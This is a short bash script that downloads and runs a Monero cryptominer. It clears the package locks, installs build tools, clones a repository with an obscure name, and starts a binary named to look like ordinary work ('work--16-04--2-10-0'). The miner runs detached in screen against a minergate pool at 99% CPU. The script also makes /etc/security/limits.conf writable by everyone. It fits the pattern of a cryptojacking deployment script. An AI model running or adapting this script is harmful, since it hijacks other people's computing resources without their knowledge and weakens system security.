#!/bin/bash
rm /var/lib/dpkg/lock
rm /var/lib/dpkg/lock-frontend
dpkg --configure -a
apt-get -y -f install screen git build-essential libuv1-dev libmicrohttpd-dev libssl-dev
apt-get -y -f install
apt-get -y -f install screen git build-essential libuv1-dev libmicrohttpd-dev libssl-dev
git clone https://github.com/dderqw/jdfe.git /home/ubuntu/jdfe
chmod 775 /home/ubuntu/jdfe/work--16-04--2-10-0
sysctl -w vm.nr_hugepages=128
chmod ugo+rwx /etc/security/limits.conf
echo 'soft memlock 262144' >> /etc/security/limits.conf
echo 'hard memlock 262144' >> /etc/security/limits.conf
sysctl -p
screen -d -m /home/ubuntu/jdfe/work--16-04--2-10-0 -a cryptonight -o xmr.pool.minergate.com:45700 -u $1 -p x -t $2 --av=2 --donate-level 0 --max-cpu-usage 99
echo It is ready to go
